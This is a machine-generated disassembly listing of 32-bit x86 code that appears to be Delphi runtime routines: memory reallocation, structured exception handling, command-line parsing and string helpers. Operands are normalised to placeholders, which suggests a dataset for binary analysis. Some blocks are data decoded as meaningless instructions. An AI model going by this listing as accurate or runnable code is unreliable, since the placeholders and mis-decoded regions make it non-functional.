call sub_401ba0
sub_40241c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401e90
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401ba0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401f94
test al al
je r-xdata
call sub_401ba0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c64
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e08
jmp r-xdata
sub_4025f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026a9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_4019fc
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40241c
test al al
je r-xdata
push rw-data
call sub_401358
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_4020e8
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028b8
mov eax ebx
call sub_402278
retn
push rw-data
call sub_401360
sub_4026bc
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402818
sub_4026dc
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402818
sub_4026fc
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402818
mov [ ecx ] eax
mov al 0x2
jmp sub_402818
retn
mov [ ecx ] eax
retn
sub_40278c
push ebx
push esi
call sub_405d58
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405d58
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405d58
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027cc
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405d58
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027c0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402854
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028b8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_4028f8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp al 0x20
jbe r-xdata
xor ebp ebp
mov edi ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_40121c
mov ebx eax
mov al [ ebx ]
cmp al 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp al 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_404608
mov ebx edi
mov edi [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_40121c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
mov al [ ebx ]
cmp al 0x20
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp al 0x22
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40121c
cmp eax ebx
jbe r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
cmp eax ebx
jbe r-xdata
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
sub_4029e4
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_403fbc
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_40125c
mov ecx eax
mov edx esp
mov eax ebx
call sub_4040ac
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_4028f8
mov edi eax
test esi esi
je r-xdata
sub_402a90
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402844
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402ae4
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402844
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402844
jmp r-xdata
sub_402b3c
push esi
push edi
mov edi eax
xor eax eax
mov al [ edi ]
mov esi edx
xor edx edx
mov dl [ esi ]
inc esi
add al dl
jb r-xdata
mov al cl
sub cl [ edi ]
jbe r-xdata
cmp al cl
ja r-xdata
pop edi
pop esi
retn
mov dl cl
jmp r-xdata
mov ecx edx
mov dl [ edi ]
mov [ edi ] al
inc edi
add edi edx
[ edi ] [ esi ]
sub_402b78
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028b8
pop ebx
retn
mov ecx ebx
sub_402b94
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402c18
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402c88
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402ca8
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402d88
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402dc8
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e7b ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e7b ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402e7b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_402f40
mov bh [ esi ]
inc eax
add [ eax ] al
bound ebp [ ebp + eax * 8 + 0x41ad78eb ]
inc eax
add [ eax + 0x26b7177a ] al
xlat
fadd [ eax + eax * 2 ]
nop
lodsb [ esi ]
outsb
xor bh [ eax - 0x7a ]
xchg [ eax + 0x40 ] ecx
add [ edi + edx * 2 + 0x68163f0a ] dh
test eax 0xa100404b
in eax dx
int3
sub_4030b4
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_4030e4
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012b4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403155
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012ac
retn
sub_4031d0
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403278
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_4032d0
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_4049f8
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4032f0
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_405640
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_403320
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4033a4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4033b4
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4033ab
lea eax [ ebp - 0x8 ]
call sub_405628
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4032f0
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_405640
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_4033b4
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4033f8
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403498
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_403438
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403468
push eax
push ecx
mov eax [ eax ]
call sub_403438
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403fb0
call [ rw-data ]
sub_403480
push esi
mov esi edx
mov eax [ eax ]
call sub_403438
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403fb0
call [ rw-data ]
sub_4034c8
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_403438
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4034f0
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_403540
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_403590
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_4035b9
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403624
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403660
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403674
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403688
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_4036a8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403688
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_40370c
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_4031a8
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405d58
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_403674
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403624
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_403838
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_4031a8
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403624
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405d58
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403660
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
